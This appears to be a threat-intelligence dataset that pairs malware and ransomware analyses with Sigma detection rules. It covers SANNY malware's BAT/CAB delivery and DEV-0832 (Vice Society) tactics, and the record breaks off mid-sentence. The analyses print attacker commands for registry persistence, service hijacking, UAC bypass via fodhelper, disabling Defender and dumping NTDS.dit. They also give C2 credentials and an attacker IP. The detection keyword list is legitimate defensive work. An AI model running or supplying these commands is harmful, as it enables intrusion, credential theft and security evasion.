> nul\n  cliconfg\n  goto EXIT\n```\n\nThe BAT file also checks for the presence of Kaspersky Lab Antivirus software on the machine. If found, CAB installation is changed accordingly in an attempt to bypass detection:\n\n```image\nAlt: Kaspersky Detection Code\nDescription: The image displays a snippet of code related to the installation process of a CAB file used in SANNY malware. It includes commands for setting a path, expanding the CAB file, deleting the original CAB file, adding a registry entry for the malware to run at startup, and invoking the 'rundll32' command to execute a DLL file. The code is formatted in a monospaced font, indicating its function as a script, and highlights key commands that illustrate the malware's behavior during installation.\nTranscription: |\n  set sPath=%LOCALAPPDATA%\\Microsoft\\Office\n  expand setup.cab -F:ipnet.* %sPath% > nul\n  del /f /q setup.cab > nul\n  reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t\n  REG_SZ /d \"rundll32 %sPath%\\ipnet.dll ServiceMain\" /f > nul\n  rundll32 %sPath%\\ipnet.dll ServiceMain\n  goto EXIT\n```\n\n### Stage 2: CAB File Analysis\n\nAs described in the previous section, the BAT file will download the CAB file based on the architecture of the underlying operating system. The rest of the malicious activities are performed by the downloaded CAB file.\n\nThe CAB file contains the following components:\n\n- `install.bat` – BAT file used to deploy and execute the components.\n- `ipnet.dll` – Main component that we refer to as SANNY malware.\n- `ipnet.ini` – Config file used by SANNY malware.\n- `NTWDBLIB.dll` – Performs UAC bypass on Windows 7 (32-bit and 64-bit).\n- `update.dll` – Performs UAC bypass on Windows 10.\n\n`install.bat` will perform the following essential activities:\n\n1. Checks the current execution directory of the BAT file. If it is not the Windows system directory, then it will first copy the necessary components (`ipnet.dll` and `ipnet.ini`) to the Windows system directory before continuing execution:\n\n   ```image\n   Alt: Install.bat Code\n   Description: The image depicts a portion of code from a BAT file used in the SANNY malware delivery method. It includes commands that check if the current execution directory is the Windows system directory and conditionally copy two files, 'ipnet.dll' and 'ipnet.ini', to the System32 directory. The code also contains commands for deleting the original files after the copy operation, indicating the malicious intent of the script.\n   Transcription: |\n     batch\n     echo %~dp0 | findstr /i \"system32\" > nul\n     IF %ERRORLEVEL% EQU 0 (GOTO INSTALL) ELSE (GOTO COPYFILE)\n     \n     :COPYFILE\n     copy /y %~dp0\\ipnet.dll %windir%\\System32 > nul\n     del /f /q %~dp0\\ipnet.dll > nul\n     \n     copy /y %~dp0\\ipnet.ini %windir%\\System32 > nul\n     del /f /q %~dp0\\ipnet.ini > nul\n   ```\n\n2. Hijacks a legitimate Windows system service, `COMSysApp` (COM+ System Application) by first stopping this service, and then modifying the appropriate Windows service registry keys to ensure that the malicious `ipnet.dll` will be loaded when the `COMSysApp` service is started:\n\n   ```image\n   Alt: Service Hijacking Code\n   Description: The image displays a code snippet related to the installation and configuration of a Windows service called `COMSysApp`. It includes commands for stopping the service, configuring it to run with a specific executable path (pointing to `svchost.exe`), and adding registry entries to ensure the malicious `ipnet.dll` is used as the service's dynamic link library (DLL). The commands indicate actions taken to hijack the legitimate service for malicious purposes.\n   Transcription: |\n     :INSTALL\n     sc stop COMSysApp > nul\n     sc config COMSysApp type= own start= auto error= normal binpath= \"%windir%\\System32\\svchost.exe -k COMSysApp\" > nul\n     reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysApp\" /f > nul\n     reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir%\\System32\\ipnet.dll\" /f > nul\n     sc start COMSysApp > nul\n   ```\n\n3. After the hijacked `COMSysApp` service is started, it will delete all remaining components of the CAB file:\n\n   ```image\n   Alt: Component Deletion Code\n   Description: The image displays a segment of code, specifically command-line instructions related to the deletion of certain files in a Windows environment. It includes commands that use the 'del' function to remove files such as 'NTWDBLIB.dll', 'update.dll', 'dummy.dll', and 'uacme.exe' from the system. The output redirection to 'nul' suggests that any output from these commands will be suppressed, indicating a stealthy approach to file deletion, which is often used in malware operations.\n   Transcription: |\n     del /f /q %~dp0\\NTWDBLIB.dll > nul\n     del /f /q %~dp0\\update.dll > nul\n     del /f /q %~dp0\\dummy.dll > nul\n     del /f /q %~dp0\\uacme.exe > nul\n   ```\n\n`ipnet.dll` is the main component inside the CAB file that is used for performing malicious activities. This DLL exports the following two functions:\n\n1. `ServiceMain` – Invoked when the hijacked system service, `COMSysApp`, is started.\n2. `Post` – Used to perform data exfiltration to the command and control (C2) server using FTP protocol.\n\nThe `ServiceMain` function first performs a check to see if it is being run in the context of `svchost.exe` or `rundll32.exe`. If it is being run in the context of `svchost.exe`, then it will first start the system service before proceeding with the malicious activities. If it is being run in the context of `rundll32.exe`, then it performs the following activities:\n\n1. Deletes the module `NTWDBLIB.DLL` from the disk using the following command:\n\n   ```\n   cmd /c taskkill /im cliconfg.exe /f /t && del /f /q NTWDBLIB.DLL\n   ```\n\n2. Sets the code page on the system to 65001, which corresponds to UTF-8:\n\n   ```\n   cmd /c REG ADD HKCU\\Console /v CodePage /t REG_DWORD /d 65001 /f\n   ```\n\n### Command and Control (C2) Communication\n\nSANNY malware uses the FTP protocol as the C2 communication channel.\n\n#### FTP Config File\n\nThe FTP configuration information used by SANNY malware is encoded and stored inside `ipnet.ini`.\n\nThis file is Base64 encoded using the following custom character set: \n`SbVIn=BU/dqNP2kWw0oCrm9xaJ3tZX6OpFc7Asi4lvuhf-TjMLRQ5GKeEHYgD1yz8`\n\nUpon decoding the file, the following credentials can be recovered:\n\n- **FTP Server:** ftp.capnix[.]com\n- **Username:** cnix_21072852\n- **Password:** vlasimir2017\n\nIt then continues to perform the connection to the FTP server decoded from the aforementioned config file, and sets the current directory on the FTP server as `htdocs` using the `FtpSetCurrentDirectoryW` function.\n\n#### System Information Collection\n\nFor reconnaissance purposes, SANNY malware executes commands on the system to collect information, which is sent to the C2 server.\n\nSystem information is gathered from the machine using the following command:\n\n```image\nAlt: System Information Collection Code\nDescription: The image displays a command line instruction used in the context of malware operation. It shows the command 'cmd /c systeminfo > %temp%\\temp.ini', which is used to collect system information on a computer and redirect the output to a temporary file named 'temp.ini' in the system's temporary directory. This command is relevant to the discussion of SANNY malware's method for gathering reconnaissance data.\nTranscription: The image displays a command line instruction used in the context of malware operation. It shows the command 'cmd /c systeminfo > %temp%\\temp.ini', which is used to collect system information on a computer and redirect the output to a temporary file named 'temp.ini' in the system's temporary directory. This command is relevant to the discussion of SANNY malware's method for gathering reconnaissance data.\n```\n\nThe list of running tasks on the system is gathered by executing the following command:\n\n```image\nAlt: Task List Collection Code\nDescription: The image depicts a command line instruction used to collect a list of running tasks on a system. The command shown is 'cmd /c tasklist > %temp%\\temp.ini', which indicates that the output of the 'tasklist' command (a list of currently running processes) is redirected to a temporary file named 'temp.ini' located in the system's temporary directory. This is relevant to the SANNY malware's operational procedures for system information collection.\nTranscription: The image depicts a command line instruction used to collect a list of running tasks on a system. The command shown is 'cmd /c tasklist > %temp%\\temp.ini', which indicates that the output of the 'tasklist' command (a list of currently running processes) is redirected to a temporary file named 'temp.ini' located in the system's temporary directory. This is relevant to the SANNY malware's operational procedures for system information collection.\n```\n\n#### C2 Commands\n\nAfter successful connection to the FTP server decoded from the configuration file, the malware searches for a file containing the substring “to everyone” in the `htdocs` directory. This file will contain C2 commands to be executed by the malware.\n\nUpon discovery of the file with the “to everyone” substring, the malware will download the file and then performs actions based on the following command names:\n\n- **chip command:** This command deletes the existing `ipnet.ini` configuration file from the file system and creates a new `ipnet.ini` file with a specified configuration string. The chip commands allows the attacker to migrate malware to a new FTP C2 server. The command has the following syntax:\n\n  ```image\n  Alt: Chip Command Code\n  Description: The image depicts a command line input related to the SANNY malware's 'chip' command. It shows the syntax for executing the command, which appears to update the FTP server configuration. The command is formatted as 'cmd /c chip <encoded_FTP_config>', where '<encoded_FTP_config>' represents a placeholder for the actual encoded FTP configuration data. This command is part of the malware's command and control (C2) communication process.\n  Transcription: The image depicts a command line input related to the SANNY malware's 'chip' command. It shows the syntax for executing the command, which appears to update the FTP server configuration. The command is formatted as 'cmd /c chip <encoded_FTP_config>', where '<encoded_FTP_config>' represents a placeholder for the actual encoded FTP configuration data. This command is part of the malware's command and control (C2) communication process.\n  ```\n\n- **pull command:** This command is used for the purpose of data exfiltration. It has the ability to upload an arbitrary file from the local filesystem to the attacker’s FTP server. The command has the following syntax:\n\n  ```image\n  Alt: Pull Command Code\n  Description: The image depicts a command syntax related to the SANNY malware, specifically focusing on the 'pull' command used for data exfiltration. The command is presented in a code format, showing how to execute the command using 'cmd /c pull <path of the file>'. This is part of a technical documentation that outlines various commands associated with the malware's command and control (C2) communication.\n  Transcription: The image depicts a command syntax related to the SANNY malware, specifically focusing on the 'pull' command used for data exfiltration. The command is presented in a code format, showing how to execute the command using 'cmd /c pull <path of the file>'. This is part of a technical documentation that outlines various commands associated with the malware's command and control (C2) communication.\n  ```\n\n  The uploaded file is compressed and encrypted using the routine described later in the Compression and Encoding Data section.\n\n- **put command:** This command is used to copy an existing file on the system to a new location and delete the file from the original location. The command has the following syntax:\n\n  ```image\n  Alt: Put Command Code\n  Description: The image depicts a command syntax for the SANNY malware's 'put' command, which is used to copy an existing file to a new location while deleting the original file. The command follows this structure: 'Cmd /c put <new_file_name> <existing_file_name>'. This image is a part of the detailed technical explanation provided in the context regarding malware commands and their functionalities.\n  Transcription: The image depicts a command syntax for the SANNY malware's 'put' command, which is used to copy an existing file to a new location while deleting the original file. The command follows this structure: 'Cmd /c put <new_file_name> <existing_file_name>'. This image is a part of the detailed technical explanation provided in the context regarding malware commands and their functionalities.\n  ```\n\n- **default command:** If the command begins with the substring `cmd /c`, but it is not followed by either of the previous commands (chip, pull, and put), then it directly executes the command on the machine using `WinExec`.\n\n- **/user command:** This command will execute a command on the system as the logged in user. The command duplicates the access token of `explorer.exe` and spawns a process using the following steps:\n\n  1. Enumerates the running processes on the system to search for the `explorer.exe` process and obtain the process ID of `explorer.exe`.\n  2. Obtains the access token for the `explorer.exe` process with the access flags set to `0x000F01FF`.\n  3. Starts the application (defined in the C2 command) on the system by calling the `CreateProcessAsUser` function and using the access token obtained in Step 2.\n\n| **C2 Command**  | **Purpose**                                         |\n| --------------- | --------------------------------------------------- |\n| chip            | Update the FTP server config file                   |\n| pull            | Upload a file from the machine                      |\n| put             | Copy an existing file to a new destination          |\n| /user           | Create a new process with explorer.exe access token |\n| default command | Execute a program on the machine using WinExec()    |\n\n### Compression and Encoding Data\n\nSANNY malware uses an interesting mechanism for compressing the contents of data collected from the system and encoding it before exfiltration. Instead of using an archiving utility, the malware leverages `Shell.Application` COM object and calls the `CopyHere` method of the `IShellDispatch` interface to perform compression as follows:\n\n1. Creates an empty ZIP file with the name: `temp.zip` in the `%temp%` directory.\n2. Writes the first 16 bytes of the PK header to the ZIP file.\n3. Calls the `CopyHere` method of `IShellDispatch` interface to compress the collected data and write to `temp.zip`.\n4. Reads the contents of `temp.zip` to memory.\n5. Deletes `temp.zip` from the disk.\n6. Creates an empty file, `post.txt`, in the `%temp%` directory.\n7. The `temp.zip` file contents are Base64 encoded (using the same custom character set mentioned in the previous FTP Config File section) and written to the file: `%temp%\\post.txt`.\n8. Calls the `FtpPutFileW` function to write the contents of `post.txt` to the remote file with the format: “from <computer_name_timestamp>.txt”\n\n### Execution on Windows 7 and User Account Control (UAC) Bypass\n\n`NTWDBLIB.dll` – This component from the CAB file will be extracted to the `%windir%\\system32` directory. After this, the `cliconfg` command is executed by the BAT file.\n\nThe purpose of this DLL module is to launch the `install.bat` file. The file `cliconfg.exe` is a legitimate Windows binary (SQL Client Configuration Utility), loads the library `NTWDBLIB.dll` upon execution. Placing a malicious copy of `NTWDBLIB.dll` in the same directory as `cliconfg.exe` is a technique known as DLL side-loading, and results in a UAC bypass.\n\n### Execution on Windows 10 and UAC Bypass\n\n`Update.dll` – This component from the CAB file is used to perform UAC bypass on Windows 10. As described in the BAT File Analysis section, if the underlying operating system is Windows 10, then it uses `update.dll` to begin the execution of code instead of invoking the `install.bat` file directly.\n\nThe main actions performed by `update.dll` are as follows:\n\n1. Executes the following commands to setup the Windows registry for UAC bypass:\n\n   ```image\n   Alt: Registry Setup Code\n   Description: The image depicts a series of command line instructions related to Windows registry modifications. It shows three commands that add registry entries to facilitate the execution of a batch file (`install.bat`) within the context of a UAC (User Account Control) bypass for Windows 10. The commands are formatted in a monospaced font and are enclosed in a box, indicating they are part of a technical description in the context of malware delivery methods.\n   Transcription: |\n     plaintext\n     cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /t REG_SZ /d %TEMP%\\install.bat /f\n     cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f\n   ```\n\n2. Leverages a UAC bypass technique that uses the legitimate Windows binary, `fodhelper.exe`, to perform the UAC bypass on Windows 10 so that the `install.bat` file is executed with elevated privileges:\n\n   ```image\n   Alt: UAC Bypass Code\n   Description: The image displays a command line instruction used in a malware execution context. It includes the command `cmd /c fodhelper && reg delete HKCU\\SOFTWARE\\Classes\\ms-settings /f`, which suggests a process that utilizes `fodhelper` to bypass User Account Control (UAC) on Windows and subsequently deletes a registry key related to `ms-settings`. This is relevant to the discussion of UAC bypass techniques employed by the SANNY malware.\n   Transcription: The image displays a command line instruction used in a malware execution context. It includes the command `cmd /c fodhelper && reg delete HKCU\\SOFTWARE\\Classes\\ms-settings /f`, which suggests a process that utilizes `fodhelper` to bypass User Account Control (UAC) on Windows and subsequently deletes a registry key related to `ms-settings`. This is relevant to the discussion of UAC bypass techniques employed by the SANNY malware.\n   ```\n\n3. Creates an additional BAT file, `kill.bat`, in the current directory to delete evidence of the UAC bypass. The BAT file kills the current process and deletes the components `update.dll` and `kill.bat` from the file system:\n\n   ```image\n   Alt: Kill.bat Code\n   Description: The image displays a code snippet that outlines commands for a batch file, specifically a `kill.bat` script used in malware operations. The commands include `taskkill` to terminate the current process, and `del` commands to forcefully delete the `update.dll` and `kill.bat` files. This code is relevant to the discussion of UAC bypass techniques employed by the SANNY malware on Windows systems.\n   Transcription: |\n     plaintext\n     taskkill /PID <pid_of_current_process> /F\n     del /f /q \"<path>\\update.dll\"\n     del /f /q \"<path>\\kill.bat\"\n   ```\n\n### Conclusion\n\nThis activity shows us that the threat actors using SANNY malware are evolving their malware delivery methods, notably by incorporating UAC bypasses and endpoint evasion techniques. By using a multi-stage attack with a modular architecture, the malware authors increase the difficulty of reverse engineering and potentially evade security solutions.\n\nUsers can protect themselves from such attacks by disabling Office macros in their settings and practicing vigilance when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources.\n\n### Indicators of Compromise\n\n| **SHA256 Hash**                                                  | **Original Filename**                                            |\n| ---------------------------------------------------------------- | ---------------------------------------------------------------- |\n| b0f30741a2449f4d8d5ffe4b029a6d3959775818bf2e85bab7fea29bd5acafa4 | РГНФ 2018-2019.doc                                               |\n| e29fad201feba8bd9385893d3c3db42bba094483a51d17e0217ceb7d3a7c08f1 | Copy of communication from Security Council Committee (1718).doc |\n| eb394523df31fc83aefa402f8015c4a46f534c0a1f224151c47e80513ceea46f | 1.bat                                                            |\n| a2e897c03f313a097dc0f3c5245071fbaeee316cfb3f07785932605046697170 | Setup.cab (64-bit)                                               |\n| a3b2c4746f471b4eabc3d91e2d0547c6f3e7a10a92ce119d92fa70a6d7d3a113 | Setup.cab (32-bit)                                               |",
    "sigma_rule": {
      "title": "Suspicious New Service Creation",
      "id": "17a1be64-8d88-40bf-b5ff-a4f7a50ebcc8",
      "related": [
        {
          "id": "7fe71fc9-de3b-432a-8d57-8c809efc10ab",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects creation of a new service via \"sc\" command or the powershell \"new-service\" cmdlet with suspicious binary paths",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md",
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-14",
      "modified": "2022-11-18",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1543.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_sc": {
          "Image|endswith": "\\sc.exe",
          "CommandLine|contains|all": [
            "create",
            "binPath="
          ]
        },
        "selection_posh": {
          "CommandLine|contains|all": [
            "New-Service",
            "-BinaryPathName"
          ]
        },
        "susp_binpath": {
          "CommandLine|contains": [
            "powershell",
            "mshta",
            "wscript",
            "cscript",
            "svchost",
            "dllhost",
            "cmd ",
            "cmd.exe /c",
            "cmd.exe /k",
            "cmd.exe /r",
            "rundll32",
            "C:\\Users\\Public",
            "\\Downloads\\",
            "\\Desktop\\",
            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
            "C:\\Windows\\TEMP\\",
            "\\AppData\\Local\\Temp"
          ]
        },
        "condition": "1 of selection* and susp_binpath"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_service_creation.yml",
    "id": "571"
  },
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/",
    "markdown": "### DEV-0832 (Vice Society) opportunistic ransomware campaigns impacting US education sector\n\n**By** Microsoft Threat Intelligence\n**October 25, 2022**\n\n---\n\n#### April 2023 update\n**Microsoft Threat Intelligence** has shifted to a new threat actor naming taxonomy aligned around the theme of weather. **DEV-0832** is now tracked as **Vanilla Tempest**.\n\nTo learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog:\n**Microsoft shifts to a new threat actor naming taxonomy**.\n\n---\n\nIn recent months, Microsoft has detected active ransomware and extortion campaigns impacting the global education sector, particularly in the US, by a threat actor we track as DEV-0832, also known as Vice Society. Shifting ransomware payloads over time from BlackCat, QuantumLocker, and Zeppelin, DEV-0832’s latest payload is a Zeppelin variant that includes Vice Society-specific file extensions, such as *.v-s0ciety*, *.v-society*, and, most recently, *.locked*. In several cases, Microsoft assesses that the group did not deploy ransomware and instead possibly performed extortion using only exfiltrated stolen data.\n\nDEV-0832 is a cybercriminal group that has reportedly been active as early as June 2021. While the latest attacks between July and October 2022 have heavily impacted the education sector, DEV-0832’s previous opportunistic attacks have affected various industries like local government and retail. Microsoft assesses that the group is financially motivated and continues to focus on organizations where there are weaker security controls and a higher likelihood of compromise and ransom payout. Before deploying ransomware, DEV-0832 relies on tactics, techniques, and procedures commonly used among other ransomware actors, including the use of PowerShell scripts, repurposed legitimate tools, exploits for publicly disclosed vulnerabilities for initial access and post-compromise elevation of privilege, and commodity backdoors like *SystemBC*.\n\nRansomware has evolved into a complex threat that’s human-operated, adaptive, and focused on a wider scale, using data extortion as a monetization strategy to become even more impactful in recent years. To find easy entry and privilege escalation points in an environment, these attackers often take advantage of poor credential hygiene and legacy configurations or misconfigurations. Defenders can build a robust defense against ransomware by reading our ransomware as a service blog.\n\nIn this blog, we detail Microsoft’s analysis of observed DEV-0832 activity, including the tactics and techniques used across the group’s campaigns, with the goal of helping customers identify, investigate, and remediate activity in their environments. We provide hunting queries to help customers comprehensively search their environments for relevant indicators as well as protection and hardening guidance to help organizations increase resilience against these and similar attacks.\n\n---\n\n### Who is DEV-0832 (Vice Society)?\n\nMicrosoft has identified multiple campaigns attributed to DEV-0832 over the past year based on the use of a unique PowerShell file name, staging directories, and ransom payloads and their accompanying notes. To gain an initial foothold in compromised networks, DEV-0832 has reportedly exploited vulnerable web-facing applications and used valid accounts. However, due to limited initial signals from affected organizations, Microsoft has not confirmed these attack vectors. Attackers then use custom PowerShell scripts, commodity tools, exploits for disclosed vulnerabilities, and native Windows binaries to gather privileged credentials, move laterally, collect and exfiltrate data, and deploy ransomware.\n\nAfter deploying ransomware, DEV-0832 demands a ransom payment, threatening to leak stolen data on the group’s *.onion* site. In some cases, Microsoft observed that DEV-0832 did not deploy ransomware. Instead, the actors appeared to exfiltrate data and dwell within compromised networks. The group sometimes avoids a ransomware payload in favor of simple extortion—threatening to release stolen data unless a payment is made.\n\nThe group also goes to significant measures to ensure that an organization cannot recover from the attack without paying the ransom: Microsoft has observed DEV-0832 access two domain administrator accounts and reset user passwords of over 150,000 users, essentially locking out legitimate users before deploying ransomware to some devices. This effectively interrupts remediation efforts, including attempts to prevent the ransomware payload or post-compromise incident response.\n\n---\n\n### Toolset\n\n#### Ransomware payloads\n\nMicrosoft has observed DEV-0832 deploy multiple commodity ransomware variants over the past year: BlackCat, QuantumLocker, Zeppelin, and most recently a Vice Society-branded variant of the Zeppelin ransomware. While many ransomware groups have shifted away from branded file extensions in favor of randomly generated ones, DEV-0832 incorporated branding with their Vice Society variant using *.v-s0ciety* or *.v-society* file extensions. Most recently in late September 2022, DEV-0832 again modified their ransomware payload to a variant dubbed RedAlert, using a *.locked* file extension.\n\nIn one July 2022 intrusion, Microsoft security researchers identified DEV-0832 attempt to deploy QuantumLocker binaries, then within five hours, attempt to deploy suspected Zeppelin ransomware binaries. Such an incident might suggest that DEV-0832 maintains multiple ransomware payloads and switches depending on target defenses or, alternatively, that dispersed operators working under the DEV-0832 umbrella might maintain their own preferred ransomware payloads for distribution. The shift from a ransomware as a service (RaaS) offering (BlackCat) to a purchased wholly-owned malware offering (Zeppelin) and a custom Vice Society variant indicates DEV-0832 has active ties in the cybercriminal economy and has been testing ransomware payload efficacy or post-ransomware extortion opportunities.\n\nIn many intrusions, DEV-0832 stages their ransomware payloads in a hidden share on a Windows system, for example accessed via a share name containing “$”. Once DEV-0832 has exfiltrated data, they then distribute the ransomware onto local devices for launching, likely using group policy, as shown in the below command:\n\n```image\nAlt: Figure 1. Group policy to distribute ransomware onto local devices\nDescription: The image displays a command-line instruction used in a ransomware deployment scenario. It shows the command 'cmd.exe /c copy' followed by a series of file paths, indicating an attempt to copy a malicious executable file from a remote location (indicated by '\\\\10.<redacted>\\') to a temporary directory on a local Windows system. The presence of the 'c$' share indicates the use of administrative shares, which are often exploited by attackers to gain access to a system's file system.\nTranscription: cmd.exe /c copy \\\\10.<redacted>\\c$\\windows\\temp\\teril.exe c:\\windows\\temp\\\n```\n\n*Figure 1. Group policy to distribute ransomware onto local devices*\n\nThe group also has cross-platform capabilities: Microsoft identified the deployment of a Vice Society Linux Encryptor on a Linux ESXi server.\n\n#### PowerShell scripts\n\nDEV-0832 uses a PowerShell script to conduct a variety of malicious activities and make system-related changes within compromised networks. Like their ransomware payloads, DEV-0832 typically stages their PowerShell scripts on a domain controller.\n\nMicrosoft security researchers have observed several variations among identified DEV-0832 PowerShell scripts, indicating ongoing refinement and development over time—while some only perform system discovery commands, other scripts are further modified to perform persistence, defense evasion, data exfiltration, and even distribute the ransomware payloads.\n\n#### Commodity tools\n\nAccording to Microsoft investigations, DEV-0832 has used two commodity backdoors in ransomware attacks: *SystemBC* and *PortStarter*.\n\n*SystemBC* is a post-compromise commodity remote access trojan (RAT) and proxy tool that has been incorporated into multiple diverse ransomware attacks. In one DEV-0832 intrusion, the attacker used both a compromised domain admin user account and a compromised contractor account to launch a PowerShell command that launched a *SystemBC* session under the value name “socks”:\n\n```image\nAlt: Figure 2. Powershell command launching a SystemBC session named ‘socks’\nDescription: The image depicts a PowerShell command that is used to launch a SystemBC session named 'socks'. The command shows parameters being passed to Powershell.exe, including options for window style, execution policy bypass, and a file reference for a domain variable. This command exemplifies how attackers can utilize PowerShell in compromised environments to initiate remote access through the SystemBC tool.\nTranscription: socks - Powershell.exe - windowstyle hidden -ExecutionPolicy Bypass -File \"$domain\" '156.96.62.54' # host\n```\n\n*Figure 2. Powershell command launching a SystemBC session named ‘socks’*\n\n*PortStarter* is a backdoor written in Go. According to Microsoft analysis, this malware provides functionality such as modifying firewall settings and opening ports to connect to pre-configured command-and-control (C2) servers.\n\nDEV-0832 has also deployed ransomware payloads using the remote launching tool Power Admin. Power Admin is a legitimate tool that provides functionality to monitor servers and applications, as well as file access auditing. If an organization has enabled Console Security settings within Power Admin, an attacker must have credentials to make authorized changes.\n\nOther commodity tools identified in DEV-0832 attacks include Advanced Port Scanner and Advanced IP Scanner for network discovery.\n\n#### Abuse of legitimate tooling\n\nLike many other ransomware actors, DEV-0832 relies on misusing legitimate system tools to reduce the need to launch malware or malicious scripts that automated security solutions might detect. Observed tools include:\n\n- Use of the Windows Management Instrumentation Command-line (WMIC) to launch commands that delete Mongo databases, other backups, and security programs.\n- Use of Impacket’s WMIexec functionality, an open-source tool to launch commands via WMI, and Impacket *atexec.py*, which launches commands using Task Scheduler.\n- Use of the vssadmin command to delete shadow copy backups on Windows Server.\n- Use of PsExec to remotely launch PowerShell, batch scripts, and deploy ransomware payloads.\n\nAdditionally, in one identified intrusion, DEV-0832 attempted to turn off Microsoft Defender Antivirus using registry commands. Enabling Microsoft Defender Antivirus tamper protection helps block this type of activity.\n\n```image\nAlt: Figure 3. Registry commands that attempt to tamper with Microsoft Defender antivirus software\nDescription: The image displays a series of registry commands related to Microsoft Defender Antivirus settings. These commands are intended to disable various features of the antivirus software, such as real-time monitoring, antivirus functionality, and behavior monitoring. The text includes commands for modifying registry values, specifically targeting policies that manage the Defender's operational parameters. The commands are written in a format recognizable in Windows PowerShell, indicating attempts to tamper with security settings.\nTranscription: |\n  Set-MpPreference -DisableRealtimeMonitoring $true\n  reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f\n  reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f\n  reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f\n  reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"MpEngine\" /m \"MpEnablePus\" /f\n  reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f\n  reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f\n  reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f\n  reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRestorePoint\" /t REG_DWORD /d \"1\" /f\n  reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f\n  reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f\n  reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f\n```\n\n*Figure 3. Registry commands that attempt to tamper with Microsoft Defender antivirus software*\n\n---\n\n### Harvesting privileged credentials for ransomware deployment\n\nLike other ransomware groups, after gaining an initial foothold within a network, DEV-0832 moves quickly to gather valid administrator local or domain credentials to ensure they can distribute ransomware payloads throughout the network for maximum impact.\n\n#### Credential dumps\n\nWhile Microsoft has not identified all the credential access techniques of DEV-0832, in many instances DEV-0832 accesses Local Security Authority Server Service (LSASS) dumps to obtain valid account credentials that were present in memory. Microsoft also observed that, instead of using a tool like Mimikatz to access a credential dump, DEV-0832 typically abuses the tool *comsvcs.dll* along with MiniDump to dump the LSASS process memory. Other ransomware actors have been observed using the same technique.\n\nIn cases where DEV-0832 obtained domain-level administrator accounts, they accessed NTDS dumps for later cracking. The following command shows the attacker exfiltrating the *NTDS.dit* file, which stores Active Directory data to an actor-created directory:\n\n```image\nAlt: Figure 4. Example of attacker command to exfiltrate the ‘NTDS.dit’ file\nDescription: The image displays a command line snippet that illustrates an attacker command used to exfiltrate the ‘NTDS.dit’ file. The command involves using 'ntdsutil.exe' with parameters aimed at creating a full Active Directory database backup. The syntax of the command is clearly visible, and it highlights a technique for obtaining sensitive Active Directory data, which is critical in the context of credential harvesting for ransomware attacks.\nTranscription: powershell 'ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp_l0gs' q q'\n```\n\n*Figure 4. Example of attacker command to exfiltrate the ‘NTDS.dit’ file*\n\n#### Kerberoast\n\nMicrosoft has also identified DEV-0832 used the malicious PowerSploit module *Invoke-Kerberoast* to perform a Kerberoast attack, which is a post-exploitation technique used to obtain credentials for a service account from Active Directory Domain Services (AD DS). The *Invoke-Kerberoast* module requests encrypted service tickets and returns them in an attacker-specified output format compatible with cracking tools. The group can use the cracked Kerberos hashes to reveal passwords for service accounts, often providing access to an account that has the equivalent of domain admin privileges.\n\nCombined with the fact that service account passwords are not usually set to expire and typically remain unchanged for a great length of time, attackers like DEV-0832 continue to rely on Kerberoasting in compromised networks. Microsoft 365 Defender blocks this attack with Antimalware Scan Interface (AMSI) and machine learning. Monitor for alerts that reference Kerberoast attacks closely as the presence of these alerts typically indicates a human adversary in your environment.\n\n#### Account creation\n\nIn one suspected DEV-0832 intrusion, Microsoft observed an operator create accounts that, based on the naming convention, were designed to blend in as admin accounts and allow persistence without malware, as shown in the following command:\n\n```image\nAlt: Figure 5. Attacker command to create accounts\nDescription: The image displays a command line input used to create a new user account in a Windows environment. The command format is shown as 'net user /add Admin_<redacted> PASSWORD123123!', where 